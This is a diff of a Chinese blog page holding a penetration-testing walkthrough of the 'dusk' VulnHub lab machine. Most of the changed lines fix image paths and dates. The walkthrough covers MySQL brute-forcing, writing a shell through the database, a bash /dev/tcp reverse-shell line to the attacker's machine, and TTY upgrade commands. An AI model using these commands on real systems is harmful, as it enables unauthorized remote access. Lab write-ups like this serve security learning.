@@ -27,18 +27,18 @@
 <meta property="og:site_name" content="一giao我里giao">
 <meta property="og:description" content="前言靶机：dusk-vulnhub 靶机IP:192.168.1.167 攻击机IP:192.168.1.124">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/.com//1.png">
-<meta property="og:image" content="http://yoursite.com/.com//2.png">
-<meta property="og:image" content="http://yoursite.com/.com//3.png">
-<meta property="og:image" content="http://yoursite.com/.com//4.png">
-<meta property="og:image" content="http://yoursite.com/.com//5.png">
-<meta property="og:image" content="http://yoursite.com/.com//7.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.png">
 <meta property="article:published_time" content="2020-01-27T03:45:03.000Z">
-<meta property="article:modified_time" content="2020-04-10T09:13:31.462Z">
+<meta property="article:modified_time" content="2020-04-11T17:17:13.125Z">
 <meta property="article:author" content="wuwuwu">
 <meta property="article:tag" content="靶机渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png">
 
 <link rel="canonical" href="http://yoursite.com/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
 
@@ -188,7 +188,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-10 17:13:31" itemprop="dateModified" datetime="2020-04-10T17:13:31+08:00">2020-04-10</time>
+                <time title="Modified: 2020-04-12 01:17:13" itemprop="dateModified" datetime="2020-04-12T01:17:13+08:00">2020-04-12</time>
               </span>
 
           
@@ -210,14 +210,14 @@
 
 
 <h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>扫端口，发现好多端口都开着</p>
-<p><img src="/.com//1.png" alt></p>
+<p><img src="/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png" alt></p>
 <p>8080端口可以获得信息</p>
-<p><img src="/.com//2.png" alt></p>
+<p><img src="/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.png" alt></p>
 <p>对<code>mysql</code>端口的爆破</p>
-<p><img src="/.com//3.png" alt></p>
+<p><img src="/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png" alt></p>
 <p>获得数据库密码</p>
 <p>然后连接数据库，写入shell</p>
-<p><img src="/.com//4.png" alt></p>
+<p><img src="/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png" alt></p>
 <p>然后反弹shell.</p>
 <p>exp:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"bash -i &gt;&amp; /dev/tcp/192.168.1.124/8888 0&gt;&amp;1"</span> | bash</span><br></pre></td></tr></table></figure>
@@ -228,7 +228,7 @@
 
 
 <p>然后在<code>kali</code>上监听8888端口</p>
-<p><img src="/.com//5.png" alt></p>
+<p><img src="/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png" alt></p>
 <p>接着安装一个tty</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">python3 -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
 
@@ -244,7 +244,7 @@
 
 
 
-<p><img src="/.com//7.png" alt="image-20200122125703259"></p>
+<p><img src="/2020/01/27/dusk-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.png" alt="image-20200122125703259"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>印象深刻……docker提权一直不成功.</p>
 <p>学会了渗透的一些思路。</p>
 
@@ -350,7 +350,7 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
